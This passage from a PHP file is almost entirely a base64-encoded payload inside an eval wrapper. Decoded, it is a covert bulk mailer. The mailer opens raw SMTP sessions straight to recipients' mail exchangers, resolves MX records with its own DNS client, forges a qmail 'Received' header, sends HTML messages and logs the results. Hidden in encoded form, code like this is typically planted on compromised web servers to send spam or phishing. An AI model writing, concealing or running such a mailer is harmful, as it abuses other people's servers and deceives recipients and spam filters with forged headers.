9ya2Vyc1skd2lkXVsnc3RlcCddKQoJCQkJCXsKCQkJCQkJY2FzZSAxOgoJCQkJCQl7CgkJCQkJCQlpZiAoJGNoZWNrX21vZGUpCgkJCQkJCQl7CgkJCQkJCQkJZWNobyAiOiRjb2RlOiI7CgkJCQkJCQkJQHNvY2tldF9zaHV0ZG93bigkc29ja2V0KTsKCQkJCQkJCQlAc29ja2V0X2Nsb3NlKCRzb2NrZXQpOwoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydjb25uJ109MDsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsncmV0J109MjUwOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJfQoJCQkJCQkJaWYgKCRjb2RlPT0yMjApIAoJCQkJCQkJewoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydzZW5kX2J1ZiddPSJIRUxPICRob3N0Ii5DUkxGOwoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydzZW5kX2xlbiddPTA7CgkJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3N0ZXAnXT0yOwoJCQkJCQkJfQoJCQkJCQkJZWxzZSBuZXh0bXgoJHdpZCk7CgkJCQkJCQkKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgMzoKCQkJCQkJewoJCQkJCQkJaWYgKCRjb2RlPT0yNTApCgkJCQkJCQl7CgkJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3NlbmRfYnVmJ109Ik1BSUwgRlJPTTo8Ii4kZnJvbS4iPiIuQ1JMRjsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsnc2VuZF9sZW4nXT0wOwoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydzdGVwJ109NDsKCQkJCQkJCX0KCQkJCQkJCWVsc2UgbmV4dG14KCR3aWQpOwoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSA1OgoJCQkJCQl7CgkJCQkJCQlpZiAoJGNvZGU9PTI1MCkKCQkJCQkJCXsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsnc2VuZF9idWYnXT0iUkNQVCBUTzo8Ii4kd29ya2Vyc1skd2lkXVsnYWRkcmVzcyddLiI+Ii5DUkxGOwoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydzZW5kX2xlbiddPTA7CgkJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3N0ZXAnXT02OwoJCQkJCQkJfQoJCQkJCQkJZWxzZSBuZXh0bXgoJHdpZCk7CgkJCQkJCQlicmVhazsJCQkJCQoJCQkJCQl9CgkJCQkJCWNhc2UgNzoKCQkJCQkJewoJCQkJCQkJaWYgKCRjb2RlPT0yNTAgfHwgJGNvZGU9PTI1MSkKCQkJCQkJCXsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsnc2VuZF9idWYnXT0iREFUQSIuQ1JMRjsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsnc2VuZF9sZW4nXT0wOwoJCQkJCQkJCSR3b3JrZXJzWyR3aWRdWydzdGVwJ109ODsKCQkJCQkJCX0KCQkJCQkJCWVsc2UgbmV4dG14KCR3aWQpOwoJCQkJCQkJYnJlYWs7CQkJCQkKCQkJCQkJfQoJCQkJCQljYXNlIDk6CgkJCQkJCXsKCQkJCQkJCWlmICgkY29kZT09MzU0KQoJCQkJCQkJewoJCQkJCQkJCSRyYW5kb21fbnVtID0gcmFuZCgxMDAwLCA1OTAwMCk7CgkJCQkJCQkJJHJhbmRvbl9udW0yID0gcmFuZCgxMDAwLCA1OTAwMCk7CgkJCQkJCQkJJFNFTkQgID0gIlJlY2VpdmVkOiAocW1haWwgJHJhbmRvbV9udW0gaW52b2tlZCBieSB1aWQgJHJhbmRvbl9udW0yKTsgIi5nbWRhdGUoImQgTSBZIEg6aTpzIE8iKS5DUkxGOwoJCQkJCQkJCSRTRU5EIC49ICJEYXRlOiAiLmdtZGF0ZSgiZCBNIFkgSDppOnMgTyIpLkNSTEY7CgkJCQkJCQkJJFNFTkQgLj0gIk1lc3NhZ2UtSUQ6IDwiLmdtZGF0ZSgiWW1kSGlzIikuIi4kcmFuZG9tX251bS5xbWFpbEAiLiRob3N0LiI+Ii5DUkxGOwoJCQkJCQkJCSRTRU5EIC49ICJTdWJqZWN0OiAiLiRzdWJqZWN0LkNSTEY7CgkJCQkJCQkJJFNFTkQgLj0gIlJlcGx5LVRvOiAkZnJvbSIuQ1JMRjsKCQkJCQkJCQkkU0VORCAuPSAiTUlNRS1WZXJzaW9uOiAxLjAiLkNSTEY7CgkJCQkJCQkJJFNFTkQgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVwiaXNvLTg4NTktMVwiIi5DUkxGOwoJCQkJCQkJCSRTRU5EIC49ICJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiA4Yml0Ii5DUkxGOwoJCQkJCQkJCSRTRU5EIC49ICJGcm9tOiA8JGZyb20+Ii5DUkxGOwoJCQkJCQkJCSRTRU5EIC49ICJUbzogIi4kd29ya2Vyc1skd2lkXVsnYWRkcmVzcyddLkNSTEY7CgkJCQkJCQkJJFNFTkQgLj0gIlgtUHJpb3JpdHk6IDMiLkNSTEY7CgkJCQkJCQkJJFNFTkQgLj0gQ1JMRjsKCQkJCQkJCQkkU0VORCAuPSAkYm9keS5DUkxGOwoJCQkJCQkJCSRTRU5EIC49IENSTEYuIi4iLkNSTEY7CgkJCQkJCQkJCgkJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3NlbmRfYnVmJ109JFNFTkQ7CgkJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3NlbmRfbGVuJ109MDsKCQkJCQkJCQkkd29ya2Vyc1skd2lkXVsnc3RlcCddPTEwOwoJCQkJCQkJfQoJCQkJCQkJZWxzZSBuZXh0bXgoJHdpZCk7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlIDExOgoJCQkJCQl7CgkJCQkJCQlAc29ja2V0X3NodXRkb3duKCRzb2NrZXQpOwoJCQkJCQkJQHNvY2tldF9jbG9zZSgkc29ja2V0KTsKCQkJCQkJCQoJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ2Nvbm4nXT0wOwoJCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3JldCddPSRjb2RlOwoKCQkJCQkJCWJyZWFrOwkJCQkJCgkJCQkJCX0KCgkJCQkJfQoJCQkJCQoJCQkJCQoKCQkJCX0KCgkJCQkvL2lmICgkcmV0PjApIGVjaG8gInJlY3ZbJHNvY2tldF0oJHJldCk6ICRidWZ8XG5cbiI7CgkJCX0KCQkJYXJyYXlfc3BsaWNlKCRyZWFkLDApOwoJCX0KCgoKCQlpZiAoY291bnQoJHdyaXRlKSkKCQl7CgkJCWZvcmVhY2ggKCR3cml0ZSBhcyAkc29ja2V0KQoJCQl7CgkJCQoJCQkJJHdpZD1maW5kX3dvcmtlcigkc29ja2V0KTsKCQkJCSR3b3JrZXJzWyR3aWRdWyd0cnknXT0wOwoJCQkJCgkJCQlpZiAoJHdvcmtlcnNbJHdpZF1bJ3N0ZXAnXT09MCkKCQkJCXsKCQkJCQllY2hvICJjb25uZWN0ZWRbJHNvY2tldF1cblxuIjsKCQkJCQkkd29ya2Vyc1skd2lkXVsnc3RlcCddPTE7CgkJCQl9CgkJCQllbHNlIGlmICgwPT0kd29ya2Vyc1skd2lkXVsnc3RlcCddJTIpCgkJCQl7CgkJCQkJLy9lY2hvICJ3cml0ZVskc29ja2V0XVxuXG4iOwoJCQkJCSRidWY9c3Vic3RyKCR3b3JrZXJzWyR3aWRdWydzZW5kX2J1ZiddLCR3b3JrZXJzWyR3aWRdWydzZW5kX2xlbiddKTsKCQkJCQlpZiAoRkFMU0U9PT0kcmV0PXNvY2tldF9zZW5kKCRzb2NrZXQsJGJ1ZixzdHJsZW4oJGJ1ZiksMCkpCgkJCQkJewoJCQkJCQlpZiAoc29ja2V0X2xhc3RfZXJyb3IoKSE9RVJSTk9fRVdPVUxEQkxPQ0spCgkJCQkJCXsKCQkJCQkJCWVjaG8gInNvY2tldF9zZW5kIGxhc3QgZXJyb3IgPSAiLnNvY2tldF9sYXN0X2Vycm9yKCkuIlxuIjsKCQkJCQkJCXNvY2tldF9jbGVhcl9lcnJvcigpOwoJCQkJCQkJbmV4dG14KCR3aWQpOwoJCQkJCQkJY29udGludWU7CgkJCQkJCX0KCQkJCQkJc29ja2V0X2NsZWFyX2Vycm9yKCk7CgkJCQkJCWNvbnRpbnVlOwoJCQkJCX0KCQkJCQkkd29ya2Vyc1skd2lkXVsnc2VuZF9sZW4nXSs9JHJldDsKCQkJCQlpZiAoc3RybGVuKCR3b3JrZXJzWyR3aWRdWydzZW5kX2J1ZiddKT09JHdvcmtlcnNbJHdpZF1bJ3NlbmRfbGVuJ10pCgkJCQkJewoJCQkJCQkvL2VjaG8gInNlbmRbIi4kd29ya2Vyc1skd2lkXVsnc3RlcCddLiJdOiAiLiR3b3JrZXJzWyR3aWRdWydzZW5kX2J1ZiddLiJ8fHxcbiI7CgkJCQkJCSR3b3JrZXJzWyR3aWRdWydzdGVwJ10rKzsKCQkJCQkJJHdvcmtlcnNbJHdpZF1bJ3JlY3ZfYnVmJ109IiI7CgkJCQkJCSR3b3JrZXJzWyR3aWRdWydyZWN2X2xlbiddPTA7CgkJCQkJfQoJCQkJfQoJCQl9CgkJCWFycmF5X3NwbGljZSgkd3JpdGUsMCk7CgkJfQoKCgl9CgkKCWZvcmVhY2ggKCR3b3JrZXJzIGFzICRkYXRhKSBpZiAoJGRhdGFbJ3JldCddPT0yNTApICRyZXR1cm5bMF0rKzsgZWxzZSAkcmV0dXJuWzFdKys7CgoJcmV0dXJuICRyZXR1cm47Cn0KCmZ1bmN0aW9uIGZpbmRfd29ya2VyKCRzb2NrZXQpCnsKCWdsb2JhbCAkd29ya2VyczsKCQoJZm9yZWFjaCAoJHdvcmtlcnMgYXMgJG51bT0+JGRhdGEpCgkJaWYgKCRkYXRhWydjb25uJ109PSRzb2NrZXQpIHJldHVybiAkbnVtOwoKCXJldHVybiAtMTsKfQoKZnVuY3Rpb24gbmV4dG14KCR3b3JrZXJfaWQpCnsKCWdsb2JhbCAkd29ya2VyczsKCQoJQHNvY2tldF9zaHV0ZG93bigkd29ya2Vyc1skd29ya2VyX2lkXVsnY29ubiddKTsKCUBzb2NrZXRfY2xvc2UoJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ2Nvbm4nXSk7CgkKCWlmICgkd29ya2Vyc1skd29ya2VyX2lkXVsnc3RlcCddPj0xMCkgcmV0dXJuOwoJCgkkd29ya2Vyc1skd29ya2VyX2lkXVsnbXhfbnVtJ10rKzsKCQoJLy9lY2hvICJuZXh0bXggZm9yICIuJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ2FkZHJlc3MnXS4iICIuJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ214X251bSddLiJcbiI7CgkKCWlmICgkd29ya2Vyc1skd29ya2VyX2lkXVsnbXhfbnVtJ10+PWNvdW50KCR3b3JrZXJzWyR3b3JrZXJfaWRdWydteF9pcHMnXSkpCgl7CgkJJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ2Nvbm4nXT0wOwoJCSR3b3JrZXJzWyR3b3JrZXJfaWRdWydyZXQnXT04MDE7CgkJcmV0dXJuOwoJfQoJJG14X251bT0kd29ya2Vyc1skd29ya2VyX2lkXVsnbXhfbnVtJ107CgkkaXA9JHdvcmtlcnNbJHdvcmtlcl9pZF1bJ214X2lwcyddWyRteF9udW1dOwoJCglpZiAoRkFMU0UgPT09ICR3b3JrZXJzWyR3b3JrZXJfaWRdWydjb25uJ109c29ja2V0X2Nvbm5lY3RfbmIoJGlwLDI1KSkKCXsKCQkkd29ya2Vyc1skd29ya2VyX2lkXVsnY29ubiddPTA7CgkJJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ3JldCddPTgwMjsKCX0KCWVsc2UgCgl7CgkJJHdvcmtlcnNbJHdvcmtlcl9pZF1bJ3N0ZXAnXT0wOwkJCgl9CgkKCQp9CgpmdW5jdGlvbiBzb2NrZXRfY29ubmVjdF9uYigkaXAsJHBvcnQpCnsKCgkkc29ja2V0PUBzb2NrZXRfY3JlYXRlKEFGX0lORVQsU09DS19TVFJFQU0sU09MX1RDUCk7CglpZiAoISRzb2NrZXQpIHJldHVybiBGQUxTRTsKCglpZiAoIUBzb2NrZXRfc2V0X25vbmJsb2NrKCRzb2NrZXQpKSB7IEBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7IEBzb2NrZXRfY2xvc2UoJHNvY2tldCk7IHJldHVybiBGQUxTRTsgfQoKCWlmIChGQUxTRT09PUBzb2NrZXRfY29ubmVjdCgkc29ja2V0LCRpcCwkcG9ydCkgJiYgc29ja2V0X2xhc3RfZXJyb3IoKSE9MTE1KQoJewoJCWVjaG8gInNvY2tldF9jb25uZWN0ICRpcDokcG9ydCBsYXN0X2Vycm9yID0gIi5zb2NrZXRfbGFzdF9lcnJvcigpLiJcbiI7IHNvY2tldF9jbGVhcl9lcnJvcigpOwoJCUBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CgkJQHNvY2tldF9jbG9zZSgkc29ja2V0KTsKCQlyZXR1cm4gRkFMU0U7Cgl9CgoJcmV0dXJuICRzb2NrZXQ7Cn0KLy9FTkQgQkxPQ0sgU0VORCBGVU5DVElPTlMKCgoKLy8gRE5TIEZVTkNUSU9OUwpmdW5jdGlvbiBkbnNfZ2V0X2xpc3QoJGRucywkZG9tYWlucywkdHlwZT0xKQp7Cgkkc29ja2V0cz1hcnJheSgpOwoJZm9yZWFjaCAoJGRvbWFpbnMgYXMgJGQ9PiRkb21haW4pCgl7CgkKCQkkZG5zX3BhY2tldCA9IGNocigwKS5jaHIoJGQpLgoJCQkJY2hyKDEpLmNocigwKS4KCQkJCWNocigwKS5jaHIoMSkuCgkJCQljaHIoMCkuY2hyKDApLgoJCQkJY2hyKDApLmNocigwKS4KCQkJCWNocigwKS5jaHIoMCk7CgkJCQkKCSRkbnNfcGFja2V0X2xlbj0xMjsKCQoJCgkJbGlzdCgkcW5hbWVfbGVuLCRxbmFtZSk9bWFrZV9RTkFNRSgkZG9tYWluKTsKCQkkZG5zX3BhY2tldCAuPSAkcW5hbWUuCgkJCQljaHIoMCkuY2hyKCR0eXBlKS4KCQkJCWNocigwKS5jaHIoMSk7CgkJJGRuc19wYWNrZXRfbGVuKz0kcW5hbWVfbGVuKzQ7CgkJCgkJCgkJJHNvY2tldHNbJGRdPWZzb2Nrb3BlbigidWRwOi8vJGRucyIsIDUzKTsKCQlmd3JpdGUoJHNvY2tldHNbJGRdLCRkbnNfcGFja2V0LCRkbnNfcGFja2V0X2xlbik7Cgl9CgkKCWZvcmVhY2ggKCRkb21haW5zIGFzICRkPT4kZG9tYWluKSBzb2NrZXRfc2V0X3RpbWVvdXQoJHNvY2tldHNbJGRdLDMpOwoJCgkkcmVzdWx0PWFycmF5KCk7CgkKCWZvcmVhY2ggKCRkb21haW5zIGFzICRkPT4kZG9tYWluKQoJewoJCgkJJGRuc19yZXBseSAgPSBmcmVhZCgkc29ja2V0c1skZF0sMSk7CgkJJGJ5dGVzID0gc29ja2V0X2dldF9zdGF0dXMoJHNvY2tldHNbJGRdKTsKCQkkZG5zX3JlcGx5IC49IGZyZWFkKCRzb2NrZXRzWyRkXSwkYnl0ZXNbJ3VucmVhZF9ieXRlcyddKTsKCQlmY2xvc2UoJHNvY2tldHNbJGRdKTsKCQkkZG5zX3JlcGx5X2xlbiA9ICRieXRlc1sndW5yZWFkX2J5dGVzJ10rMTsKCQkKCgkJCgkJLy9yZWFkIGhlYWRlcgoJCSRxdWVzdGlvbl9jb3VudCA9IG1ha2Vfd29yZChvcmQoJGRuc19yZXBseXs0fSksb3JkKCRkbnNfcmVwbHl7NX0pKTsKCQkkYW5zd2VyX2NvdW50ID0gbWFrZV93b3JkKG9yZCgkZG5zX3JlcGx5ezZ9KSxvcmQoJGRuc19yZXBseXs3fSkpOwoJCSRhdXRob3JpdHkgPSBtYWtlX3dvcmQob3JkKCRkbnNfcmVwbHl7OH0pLG9yZCgkZG5zX3JlcGx5ezl9KSk7CgkJJGFkZGl0aW9uYWwgPSBtYWtlX3dvcmQob3JkKCRkbnNfcmVwbHl7MTB9KSxvcmQoJGRuc19yZXBseXsxMX0pKTsKCQkKCQkkc2Vlaz0xMjsKCgkJLy9za2lwIHF1ZXN0aW9ucwoJCWZvciAoJHE9MDskcTwkcXVlc3Rpb25fY291bnQ7JHErKykKCQl7CgkJCSRuYW1lID0gcGFyc2VfbmFtZSgkZG5zX3JlcGx5LCRzZWVrKTsKCQkJJHNlZWsrPTQ7CgkJfQoJCS8vcmVhZCBhbnN3ZXJzCgkJZm9yICgkaT0wOyRpPCRhbnN3ZXJfY291bnQ7JGkrKykKCQl7CgoJCQkkbmFtZSA9IHBhcnNlX25hbWUoJGRuc19yZXBseSwkc2Vlayk7CgoJCQkkcnJ0eXBlID0gbWFrZV93b3JkKG9yZCgkZG5zX3JlcGx5eyRzZWVrfSksb3JkKCRkbnNfcmVwbHl7JHNlZWsrMX0pKTsgJHNlZWsrPTI7CgkJCSRycmNsYXNzID0gbWFrZV93b3JkKG9yZCgkZG5zX3JlcGx5eyRzZWVrfSksb3JkKCRkbnNfcmVwbHl7JHNlZWsrMX0pKTsgJHNlZWsrPTI7CgoJCQkkc2Vlays9NDsgLy9UVEwKCQkJJHJkbGVuID0gbWFrZV93b3JkKG9yZCgkZG5zX3JlcGx5eyRzZWVrfSksb3JkKCRkbnNfcmVwbHl7JHNlZWsrMX0pKTsgJHNlZWsrPTI7CgoJCQlpZiAoJHJydHlwZT09MSkgLy9BCgkJCXsKCQkJCSRhPW9yZCgkZG5zX3JlcGx5eyRzZWVrfSk7ICRzZWVrKys7CgkJCQkkYj1vcmQoJGRuc19yZXBseXskc2Vla30pOyAkc2VlaysrOwoJCQkJJGM9b3JkKCRkbnNfcmVwbHl7JHNlZWt9KTsgJHNlZWsrKzsKCQkJCSRkPW9yZCgkZG5zX3JlcGx5eyRzZWVrfSk7ICRzZWVrKys7CgoJCQkJJGlwND0kYS4iLiIuJGIuIi4iLiRjLiIuIi4kZDsKCQkJCWlmICghaXNzZXQoJHJlc3VsdFskZG9tYWluXSkpICRyZXN1bHRbJGRvbWFpbl09YXJyYXkoKTsKCQkJCWlmICghaW5fYXJyYXkoJGlwNCwkcmVzdWx0WyRkb21haW5dKSkgJHJlc3VsdFskZG9tYWluXVtdPSRpcDQ7CgkJCX0KCQkJZWxzZWlmICgkcnJ0eXBlPT0xNSkgLy9NWAoJCQl7CgkJCQkkcHJlZj1tYWtlX3dvcmQob3JkKCRkbnNfcmVwbHl7JHNlZWt9KSxvcmQoJGRuc19yZXBseXskc2VlaysxfSkpOyAkc2Vlays9MjsKCQkJCSRteG5hbWU9cGFyc2VfbmFtZSgkZG5zX3JlcGx5LCRzZWVrKTsKCgkJCQlpZiAoIWlzc2V0KCRyZXN1bHRbJGRvbWFpbl0pKSAkcmVzdWx0WyRkb21haW5dPWFycmF5KCk7CgkJCQlpZiAoIWluX2FycmF5KCRteG5hbWUsJHJlc3VsdFskZG9tYWluXSkpICRyZXN1bHRbJGRvbWFpbl1bXT0kbXhuYW1lOwoJCQl9CgkJfQoJCQoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KCmZ1bmN0aW9uIG1ha2VfUU5BTUUoJGRvbWFpbikKewoJJGxlbj0wOwoJJGRvdF9wb3MgPSAwOwoJJHRlbXAgPSAiIjsKCSRRTkFNRSA9ICIiOwoJd2hpbGUoZmFsc2UgIT09ICRkb3RfcG9zPXN0cnBvcygkZG9tYWluLCIuIikpCgl7CgkJJHRlbXAgICA9IHN1YnN0cigkZG9tYWluLDAsJGRvdF9wb3MpOwoJCSRkb21haW4gPSBzdWJzdHIoJGRvbWFpbiwkZG90X3BvcysxKTsKCQkkUU5BTUUgLj0gY2hyKHN0cmxlbigkdGVtcCkpLiR0ZW1wOwoJCSRsZW4gKz0gMStzdHJsZW4oJHRlbXApOwoJfQoKCSRRTkFNRSAuPSBjaHIoc3RybGVuKCRkb21haW4pKS4kZG9tYWluLmNocigwKTsKCSRsZW4gKz0gMStzdHJsZW4oJGRvbWFpbikrMTsKCXJldHVybiBhcnJheSgkbGVuLCRRTkFNRSk7Cn0KCmZ1bmN0aW9uIHBhcnNlX25hbWUoJHBhY2tldCwmJG9mZnNldCkKewoJJG9jdGV0cz1hcnJheSgpOwoJJGJ5dGUgPSBvcmQoJHBhY2tldHskb2Zmc2V0fSk7Cgkkb2Zmc2V0Kys7Cgl3aGlsZSAoJGJ5dGUhPTApCgl7CgkJaWYgKCRieXRlPT0xOTIpCgkJewoJCQkkc2F2ZV9vZmZzZXQ9JG9mZnNldDsKCQkJJG9mZnNldD1vcmQoJHBhY2tldHskc2F2ZV9vZmZzZXR9KTsKCQkJJHNhdmVfb2Zmc2V0Kys7CgkJCSR0bXAgPSBwYXJzZV9uYW1lKCRwYWNrZXQsJG9mZnNldCk7CgkJCSRvZmZzZXQ9JHNhdmVfb2Zmc2V0OwoJCQlpZiAoY291bnQoJG9jdGV0cykpIHJldHVybiBpbXBsb2RlKCIuIiwkb2N0ZXRzKS4iLiIuJHRtcDsKCQkJcmV0dXJuICR0bXA7CgkJfQoJCSRvY3RldF9sZW4gPSAkYnl0ZTsKCQkkb2N0ZXQ9IiI7CgkJZm9yICgkaT0wOyRpPCRvY3RldF9sZW47JGkrKykKCQl7CgkJCSRvY3RldCAuPSAkcGFja2V0eyRvZmZzZXR9OwoJCQkkb2Zmc2V0Kys7CgkJfQoJCSRvY3RldHNbXT0kb2N0ZXQ7CgkJJGJ5dGUgPSBvcmQoJHBhY2tldHskb2Zmc2V0fSk7CgkJJG9mZnNldCsrOwoJfQoKCXJldHVybiBpbXBsb2RlKCIuIiwkb2N0ZXRzKTsKfQoKZnVuY3Rpb24gbWFrZV93b3JkKCR4LCR5KQp7CglyZXR1cm4gMjU2KiR4KyR5Owp9Ci8vIEVORCBETlMgRlVOQ1RJT05TCgpmdW5jdGlvbiBvdXRwdXQoJHN0cikKewoJJGY9Zm9wZW4oImxvZy50eHQiLCJhKyIpOwoJaWYgKCRmKQoJewoJCWZ3cml0ZSgkZiwkc3RyKTsKCQlmY2xvc2UoJGYpOwoJfQp9Cgo='));?>